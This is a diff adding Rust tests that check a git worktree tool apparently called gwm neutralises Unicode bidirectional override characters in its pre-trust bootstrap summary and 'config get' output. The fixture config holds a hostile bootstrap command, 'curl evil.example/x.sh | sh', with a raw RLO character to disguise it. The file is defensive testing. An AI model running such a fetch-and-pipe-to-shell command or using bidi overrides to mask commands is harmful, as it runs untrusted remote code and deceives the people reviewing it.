@@ -233,6 +233,93 @@ fn the_pre_trust_bootstrap_summary_neutralises_control_bytes() {
   );
 }
 
+/// The Unicode bidirectional formatting characters found in `s`.
+///
+/// Deliberately **not** [`control_bytes`]: these are `Cf` (format), not `Cc`
+/// (control), so `char::is_control` never matches one and an assertion built
+/// on that helper could not fail here. That is the gap itself — they reorder
+/// how a terminal renders the text around them without ever being a control
+/// byte, which defeats the same "what you read is what is there" guarantee
+/// the control-byte replacement provides (issue #502).
+fn bidi_chars(s: &str) -> Vec<char> {
+  s.chars()
+    .filter(|c| matches!(c, '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}'))
+    .collect()
+}
+
+/// A `.gwm.toml` carrying a raw `RLO` (`U+202E`) in the two fields a reader
+/// has to trust most.
+///
+/// The character is written **raw**, not as TOML's own `\u202E` escape: it is
+/// `Cf`, so the parser accepts it inside a basic string and hands it through
+/// as a *value*, which is how it would arrive from a cloned repo. A raw
+/// control byte cannot travel that way, which is why [`HOSTILE_CONFIG`] has
+/// to use escapes and this fixture does not.
+fn bidi_config() -> String {
+  const RLO: char = '\u{202E}';
+  format!(
+    "[worktree]\n\
+     branch_pattern = \"{RLO}{{type}}/#{{issue}}-{{desc}}\"\n\
+     \n\
+     [[bootstrap.command]]\n\
+     name = \"setup\"\n\
+     run = \"curl evil.example/x.sh | sh{RLO}\"\n"
+  )
+}
+
+#[test]
+fn the_pre_trust_bootstrap_summary_neutralises_bidi_overrides() {
+  // Same site as the control-byte test above, and the highest-stakes one for
+  // the same reason: the summary's whole job is to let someone decide whether
+  // to authorise a shell command out of a repo they have not vetted. An `RLO`
+  // reorders how the terminal renders what follows, so the line can read
+  // benign while the executed bytes differ — a summary that can be made to
+  // misrepresent the command it asks about is worse than no summary.
+  let cfg: gwm::config::Config = toml::from_str(&bidi_config()).unwrap();
+  let lines = gwm::cli::bootstrap_summary_lines(&cfg);
+
+  let joined = lines.join("\n");
+  assert!(
+    bidi_chars(&joined).is_empty(),
+    "the pre-trust summary replayed {:?}:\n{:?}",
+    bidi_chars(&joined),
+    joined
+  );
+  // Replace, don't strip: the command still has to be legible, and the
+  // neutralised character still has to be visible as one.
+  assert!(
+    joined.contains("curl evil.example/x.sh | sh?"),
+    "the summary must still name the command, got {:?}",
+    joined
+  );
+}
+
+#[test]
+fn config_get_neutralises_a_bidi_override() {
+  // `config list` renders values with `{:?}`, and `escape_debug` escapes `Cf`,
+  // so that path was never the hole. `config get` prints the value through the
+  // single-row sink instead, which is the one that has to grow the rule.
+  let (dir, _repo) = init_repo();
+  fs::write(dir.path().join(".gwm.toml"), bidi_config()).unwrap();
+
+  let out = gwm_in(dir.path())
+    .args(["config", "get", "worktree.branch_pattern"])
+    .output()
+    .unwrap();
+  let stdout = String::from_utf8_lossy(&out.stdout);
+  assert!(
+    bidi_chars(&stdout).is_empty(),
+    "`gwm config get` replayed {:?} from .gwm.toml:\n{:?}",
+    bidi_chars(&stdout),
+    stdout
+  );
+  assert!(
+    stdout.contains("?{type}/#{issue}-{desc}"),
+    "the pattern should stay readable minus its reordering character, got {:?}",
+    stdout
+  );
+}
+
 #[test]
 fn trust_show_neutralises_control_bytes_in_the_ledger() {
   // `trust show` prints the ledger verbatim, and a ledger row records an
